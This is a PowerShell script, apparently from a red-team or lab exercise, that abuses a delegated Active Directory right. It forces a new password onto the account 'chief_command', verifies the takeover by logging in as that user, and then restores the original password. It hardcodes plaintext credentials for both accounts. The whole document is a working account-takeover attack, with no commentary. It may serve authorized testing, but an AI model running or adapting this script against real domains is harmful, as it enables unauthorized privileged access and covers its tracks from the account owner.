param(
    [string]$TargetUser = 'chief_command',
    [string]$DomainRoot = 'cadre.local',
    [string]$AttackUser = 'hunter_dfir',
    [string]$AttackPassword = 'DF1R_Hunt3r!',
    [string]$Dc = 'dc01.cadre.local',
    [string]$NewPwd = 'RedStrike_T015!',
    [string]$OrigPwd = 'C0mm@nd_Ch1ef!'
)
$ErrorActionPreference = 'Stop'

$cred = New-Object System.Management.Automation.PSCredential("$DomainRoot\$AttackUser", (ConvertTo-SecureString $AttackPassword -AsPlainText -Force))
$netCred = $cred.GetNetworkCredential()
$targetDn = "CN=$TargetUser,OU=Command,DC=cadre,DC=local"

# Attempt Set-DomainUserPassword via DirectoryEntry
$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/$targetDn", $netCred.UserName, $netCred.Password)
$entry.RefreshCache()
Write-Output "BOUND as $($netCred.UserName)"

try {
  # Use the extended-right to change the target user's password
  $newEntry = $entry
  $newEntry.Invoke("SetPassword", @($NewPwd))
  $newEntry.CommitChanges()
  Write-Output "T015_OK: password changed to temporary"
} catch {
  Write-Output "SETPASSWORD_ERR: $($_.Exception.Message)"
}

# Verify: try authenticating as chief_command with the new password
Write-Output "--- Verify new password ---"
try {
  $vCred = New-Object System.Management.Automation.PSCredential("$DomainRoot\$TargetUser", (ConvertTo-SecureString $NewPwd -AsPlainText -Force))
  $vNet = $vCred.GetNetworkCredential()
  $vEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Dc/DC=cadre,DC=local", $vNet.UserName, $vNet.Password)
  $vEntry.RefreshCache()
  Write-Output "VERIFY_OK: new password works"
} catch {
  Write-Output "VERIFY_ERR: $($_.Exception.Message)"
}

# Restore original password
Write-Output "--- Restore original password ---"
try {
  $entry.Invoke("SetPassword", @($OrigPwd))
  $entry.CommitChanges()
  Write-Output "RESTORE_OK"
} catch {
  Write-Output "RESTORE_ERR: $($_.Exception.Message)"
}
